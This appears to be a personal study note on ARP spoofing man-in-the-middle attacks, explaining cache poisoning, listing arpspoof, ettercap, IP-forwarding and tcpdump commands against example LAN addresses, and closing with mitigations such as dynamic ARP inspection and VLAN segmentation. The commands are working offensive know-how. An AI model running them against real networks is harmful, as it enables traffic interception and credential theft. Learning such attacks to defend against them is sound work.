---
tags:
  - attack
date: 2023-09-1
---
- MitM attack.
- Send fake [[ARP (Address Resolution Protocol)|ARP]] replies to trick devices into associated MAC addresses with other devices.
- Enables:
	- interception of traffic.
	- credential harvesting.
	- session hijacking.
	- DNS spoofing/redirection.
# How It Works

- Repeatedly sends forged ARP replies like:
	- `The gateway is at my MAC`
	- `The victim is at my MAC`
- Poisons the ARP cache of the victim/gateway.
# Tools/Commands

- IP forwarding must be enabled on Kali/Linux:
	- `echo 1 > /proc/sys/net/ipv4/ip_forward`
- Perform ARP spoofing with [[arpspoof]]:
	- `arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1`
		- -t = victim
		- -r = router/gateway
- Perform with [[Ettercap]]:
	- `ettercap -T -q -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/`
- Sniff creds with [[Tcpdump]], [[Wireshark]] or [[Mitmproxy]]:
	- `tcpdump -i eth0 port 80 or port 443`
# Mitigations

- Static ARP entries (small networks).
- [[DHCP]] snooping + dynamic ARP inspections (managed switches).
- Enable port security.
- Encrypted protocols.
- Segment/isolate sensitive systems on separate VLANs.

